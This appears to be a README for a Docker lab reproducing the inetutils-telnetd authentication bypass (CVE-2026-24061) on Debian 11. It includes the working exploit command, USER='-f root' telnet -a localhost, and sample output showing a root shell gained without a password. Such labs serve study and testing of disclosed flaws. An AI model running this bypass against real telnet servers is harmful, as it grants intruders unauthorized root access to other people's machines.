# inetutils-telnetd auth bypass lab, CVE-2026-24061

A small lab to play with the auth bypass in inetutils-telnetd 1.9.3 - 2.7 as disclosed on the oss-sec mailing list. [0]

This container relies on the fact that inetutils-telnetd is still a vulnerable version in Debian 11 (Bullseye). At the time of creating this, it was:

```text
root@ba8cc6858b87:/# apt search inetutils-telnetd
Sorting... Done
Full Text Search... Done
inetutils-telnetd/oldoldstable 2:2.0-1+deb11u2 arm64
  telnet server
```

## build

Clone and build the container with `docker build -t telnetd-exploit .`.

## run

Run the container with `docker run --rm -it telnetd-exploit`. A message will show you the PoC.

```text
docker run --rm -it telnetd-exploit
Starting internet superserver: inetd.
You are user1. Try telnet as root with: USER='-f root' telnet -a localhost
user1@114102afa5d3:/$
```

A successful run would look something like this:

```text
user1@114102afa5d3:/$ USER='-f root' telnet -a localhost
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.

Linux 6.17.8 (114102afa5d3) (pts/1)

Linux 114102afa5d3 6.17.8 #1 SMP PREEMPT Thu Nov 20 09:34:02 UTC 2025 aarch64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@114102afa5d3:~#
```

[0] <https://seclists.org/oss-sec/2026/q1/89>
